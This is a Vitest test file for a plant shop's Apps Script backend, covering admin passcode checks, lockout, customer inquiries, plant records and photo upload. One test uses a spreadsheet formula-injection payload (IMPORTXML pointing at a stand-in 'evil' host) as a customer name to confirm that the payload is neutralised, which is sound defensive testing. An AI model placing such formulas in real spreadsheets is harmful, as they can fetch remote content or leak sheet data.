import { describe, expect, it } from "vitest";
import { loadBackend } from "./fakeAppsScript";

const PIN = "482193";
const admin = { adminPin: PIN };
const plant = { name: "Bromelia", altName: "Neoregelia", category: "Luar Rumah", price: 25, stock: 3, status: "Available" };
const inquiry = {
  action: "SUBMIT_INQUIRY",
  customerName: "Pelanggan Ujian",
  customerPhone: "+60123456789",
  pickupPreference: "Isnin, 9 Nov · 9–11 pagi",
  items: [{ id: "a", name: "Bromelia", price: 25, qty: 2 }],
  totalPrice: 50,
  notes: "",
};

describe("admin passcode", () => {
  it("rejects a wrong passcode and accepts the right one", () => {
    const api = loadBackend();
    expect(api.post({ action: "VERIFY_PIN", adminPin: "000000" }).code).toBe("BAD_PIN");
    expect(api.post({ action: "VERIFY_PIN", ...admin }).status).toBe("success");
  });

  it("protects every admin action, including reading customer details", () => {
    const api = loadBackend();
    api.post(inquiry);
    for (const action of ["SAVE_PLANT", "DELETE_PLANT", "LIST_INQUIRIES", "SET_INQUIRY_STATUS"]) {
      const res = api.post({ action, plant });
      expect(res.code).toBe("BAD_PIN");
      expect(JSON.stringify(res)).not.toContain("Pelanggan");
    }
  });

  it("locks after repeated failures, even for the right passcode", () => {
    const api = loadBackend();
    for (let i = 0; i < 5; i++) api.post({ action: "VERIFY_PIN", adminPin: "bad" });
    expect(api.post({ action: "VERIFY_PIN", ...admin }).code).toBe("LOCKED");
  });

  it("refuses all admin actions until a passcode is configured", () => {
    expect(loadBackend({}).post({ action: "VERIFY_PIN", adminPin: "" }).code).toBe("NOT_CONFIGURED");
  });
});

describe("inquiries", () => {
  it("logs an inquiry without the passcode, starting as Baru", () => {
    const api = loadBackend();
    const { inquiryId } = api.post(inquiry);
    const [record] = api.post({ action: "LIST_INQUIRIES", ...admin }).inquiries;
    expect(record).toMatchObject({ inquiryId, status: "Baru", totalPrice: 50 });
    expect(record.items[0].name).toBe("Bromelia");
  });

  it("changes status and rejects unknown ones", () => {
    const api = loadBackend();
    const { inquiryId } = api.post(inquiry);
    expect(api.post({ action: "SET_INQUIRY_STATUS", ...admin, inquiryId, status: "Hacked" }).status).toBe("error");
    expect(api.post({ action: "SET_INQUIRY_STATUS", ...admin, inquiryId, status: "Selesai" }).status).toBe("success");
    expect(api.post({ action: "LIST_INQUIRIES", ...admin }).inquiries[0].status).toBe("Selesai");
  });

  it("changes only the status cell, so customers' text can't become a live formula", () => {
    const api = loadBackend();
    const { inquiryId } = api.post(inquiry);
    api.post({ action: "SET_INQUIRY_STATUS", ...admin, inquiryId, status: "Disahkan" });
    expect(api.rowRewrites).toEqual([]);
  });

  it("neutralises spreadsheet formulas and keeps phone numbers as text", () => {
    const api = loadBackend();
    api.post({ ...inquiry, customerName: '=IMPORTXML("http://evil","//a")', notes: "@SUM(A1)" });
    const row = api.sheets.get("Inquiries")![1];
    expect(row[2]).toBe(`'=IMPORTXML("http://evil","//a")`);
    expect(row[3]).toBe("'+60123456789");
    expect(row[7]).toBe("'@SUM(A1)");
  });

  it("rejects an empty basket", () => {
    expect(loadBackend().post({ ...inquiry, items: [] }).status).toBe("error");
  });

  it("emails only when an address is configured", () => {
    const silent = loadBackend();
    silent.post(inquiry);
    expect(silent.sentEmails).toHaveLength(0);

    const notified = loadBackend({ ADMIN_PIN: PIN, NOTIFY_EMAIL: "owner@example.com" });
    notified.post(inquiry);
    expect(notified.sentEmails).toHaveLength(1);
  });

  it("never exposes inquiries through the public GET", () => {
    const api = loadBackend();
    api.post(inquiry);
    expect(JSON.stringify(api.get())).not.toContain("Pelanggan");
  });
});

describe("plants", () => {
  it("creates, updates and deletes, keeping stock and the other name", () => {
    const api = loadBackend();
    const { plantId } = api.post({ ...admin, action: "SAVE_PLANT", plant });
    expect(api.get().plants[0]).toMatchObject({ altName: "Neoregelia", stock: 3 });

    api.post({ ...admin, action: "SAVE_PLANT", plant: { ...plant, id: plantId, status: "Sold Out", stock: 0 } });
    expect(api.get().plants).toHaveLength(1);
    expect(api.get().plants[0]).toMatchObject({ id: plantId, status: "Sold Out", stock: 0 });

    expect(api.post({ ...admin, action: "DELETE_PLANT", plantId }).status).toBe("success");
    expect(api.post({ ...admin, action: "DELETE_PLANT", plantId }).status).toBe("error");
    expect(api.get().plants).toEqual([]);
  });

  it("gives plants added back to back different ids", () => {
    const api = loadBackend();
    const a = api.post({ ...admin, action: "SAVE_PLANT", plant });
    const b = api.post({ ...admin, action: "SAVE_PLANT", plant });
    expect(a.plantId).not.toBe(b.plantId);
    expect(api.get().plants).toHaveLength(2);
  });

  it("uploads a photo to Drive and stores its public URL", () => {
    const api = loadBackend();
    const res = api.post({ ...admin, action: "SAVE_PLANT", plant: { ...plant, imageBase64: "data:image/jpeg;base64,AAAA" } });
    expect(res.imageUrl).toContain("id=file1");
    expect(api.uploads).toHaveLength(1);
  });

  it("reports an error instead of silently dropping a photo when Drive isn't set up", () => {
    const api = loadBackend({ ADMIN_PIN: PIN });
    const res = api.post({ ...admin, action: "SAVE_PLANT", plant: { ...plant, imageBase64: "data:image/jpeg;base64,AAAA" } });
    expect(res.status).toBe("error");
    expect(api.get().plants).toEqual([]);
  });
});
